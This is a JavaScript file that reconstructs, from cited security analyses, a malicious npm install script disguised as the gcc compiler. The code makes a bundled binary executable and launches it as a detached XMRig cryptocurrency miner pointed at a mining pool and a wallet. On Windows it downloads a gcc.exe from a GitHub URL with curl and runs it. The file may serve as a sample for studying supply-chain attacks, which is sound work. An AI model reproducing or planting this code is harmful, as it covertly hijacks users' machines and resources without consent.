// crypto-miner-gcc — reconstructed from public security analyses
// Source: https://blog.phylum.io/cryptocurrency-miner-masquerading-as-gcc-compiler-found-in-npm-package/
//
// Ships an ELF binary named "gcc" that is actually an XMRig crypto miner.
// The build function calls chmod a+x and executes it.
//
// Technique: Binary masquerading + crypto miner + postinstall execution

const fs = require("fs");
const path = require("path");
const os = require("os");
const { exec, execSync } = require("child_process");

var platform = os.platform();

if (platform === "linux" || platform === "darwin") {
  var binaryPath = path.join(__dirname, "gcc");

  // Make binary executable
  try {
    execSync("chmod a+x " + binaryPath);
  } catch(e) {}

  // Execute the "compiler" (actually XMRig miner)
  var child = exec(binaryPath + " --donate-level 1 -o pool.minexmr.com:443 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nP3VNbCPNim6gsVQt02Mhbtjg -p x --tls", {
    detached: true,
    windowsHide: true
  });

  // Detach so miner runs after npm install exits
  if (child && child.unref) {
    child.unref();
  }
} else if (platform === "win32") {
  // Windows variant: download miner from GitHub
  try {
    execSync('curl -sLo "%TEMP%\\gcc.exe" "https://github.com/user/repo/releases/download/v1/gcc.exe"');
    exec('"%TEMP%\\gcc.exe" --donate-level 1 -o pool.minexmr.com:443', { detached: true, windowsHide: true });
  } catch(e) {}
}
